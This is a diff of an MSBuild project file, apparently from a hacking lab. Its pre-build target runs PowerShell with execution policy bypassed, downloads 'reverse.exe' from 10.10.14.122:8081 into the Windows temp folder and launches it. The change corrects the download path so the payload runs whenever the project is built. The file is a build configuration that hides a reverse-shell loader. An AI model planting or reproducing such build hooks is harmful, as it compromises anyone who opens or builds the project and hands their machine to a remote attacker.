@@ -9,7 +9,7 @@
   </PropertyGroup>
 
   <Target Name="PreBuild" BeforeTargets="PreBuildEvent">
-    <Exec Command="powershell -ep bypass &quot;iwr -uri http://10.10.14.122:8081/reverse.exe -OutFile c:\windows\temp ;Start-Process -FilePath c:\windows\temp\reverse.exe&quot;" />
+    <Exec Command="powershell -ep bypass &quot;iwr -uri http://10.10.14.122:8081/reverse.exe -OutFile c:\windows\temp\reverse.exe;Start-Process -FilePath C:\windows\temp\reverse.exe" />
   </Target>
 
 </Project>
